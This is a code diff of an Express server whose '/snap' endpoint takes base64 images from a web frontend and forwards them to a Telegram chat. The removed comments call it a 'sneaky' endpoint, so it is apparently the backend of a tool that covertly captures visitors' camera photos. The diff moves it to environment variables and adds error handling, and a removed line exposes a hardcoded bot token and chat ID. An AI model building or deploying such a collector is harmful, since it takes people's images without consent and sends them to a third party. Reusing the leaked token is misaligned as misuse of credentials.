@@ -1,23 +1,35 @@
 const express = require('express');
-const TelegramBot = require('telegram-bot-api');
+const fs = require('fs');
+const path = require('path');
+const TelegramBot = require('node-telegram-bot-api');
+
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Replace with your bot TOKEN & CHAT_ID
-const bot = new TelegramBot({ token: '8268626274:AAHy8elZIlhpGfcnQTcgtIwOPPp7n36pbB8' });
-const chatId = '8381620130';
+// ENV variables (Railway)
+const bot = new TelegramBot(process.env.BOT_TOKEN);
+const chatId = process.env.CHAT_ID;
 
-app.use(express.static('public')); // Host frontend
-app.use(express.json());
+// allow big base64
+app.use(express.json({ limit: '10mb' }));
+app.use(express.static('public'));
 
-// Sneaky endpoint to receive snaps 🎯
 app.post('/snap', async (req, res) => {
-  const image = req.body.image.replace(/^data:image\/\w+;base64,/, '');
-  const buffer = Buffer.from(image, 'base64');
-  
-  // Send to Telegram like a boss 😈
-  await bot.sendPhoto({ chat_id: chatId, photo: buffer });
-  res.sendStatus(200);
+  try {
+    const base64Data = req.body.image.replace(/^data:image\/png;base64,/, '');
+    const filePath = path.join(__dirname, 'photo.png');
+
+    fs.writeFileSync(filePath, base64Data, 'base64');
+
+    await bot.sendPhoto(chatId, fs.createReadStream(filePath));
+
+    res.sendStatus(200);
+  } catch (err) {
+    console.error(err);
+    res.sendStatus(500);
+  }
 });
 
-app.listen(port, () => console.log(`😈 Server live on ${port}!`));
+app.listen(port, () => {
+  console.log('Server running on port ' + port);
+});
